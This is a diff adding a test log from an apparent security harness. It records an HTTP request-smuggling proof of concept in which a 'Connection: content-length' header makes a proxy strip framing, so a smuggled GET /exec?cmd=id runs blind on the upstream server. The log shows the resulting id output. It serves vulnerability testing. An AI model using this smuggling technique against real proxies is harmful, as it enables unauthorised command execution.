@@ -1,0 +1,21 @@
+build  : 1cfd33433d25__61cc738c (stage-10, release/000001)
+sink   : line 67 proxy() header-copy loop — !hasToken(conn,v.first) drops any attacker-named header,
+         then the while(body>0) loop still copies the body. Upstream gets a POST with no framing.
+upstream model: parses request-by-request off a persistent buffer and runs /exec?cmd=;
+         the proxy relays only the first response, so the injected run is blind.
+
+##### 61cc738c
+--- CONFIG: exact Content-Length (control)
+  ONE client request was sent. Upstream parsed:
+     POST /api/api/x HTTP/1.1   (Content-Length: 38)
+  => nothing executed (body consumed as POST payload)
+  client saw 1 upstream request(s) worth of traffic; response: b'HTTP/1.1 200 OK'
+
+--- CONFIG: Connection: content-length (attack)
+  ONE client request was sent. Upstream parsed:
+     POST /api/api/x HTTP/1.1   (Content-Length: ABSENT)
+     GET /exec?cmd=id HTTP/1.1   (Content-Length: ABSENT)
+  => injected command EXECUTED upstream:
+     uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),101(lxd)
+  client saw 2 upstream request(s) worth of traffic; response: b'HTTP/1.1 200 OK'
+
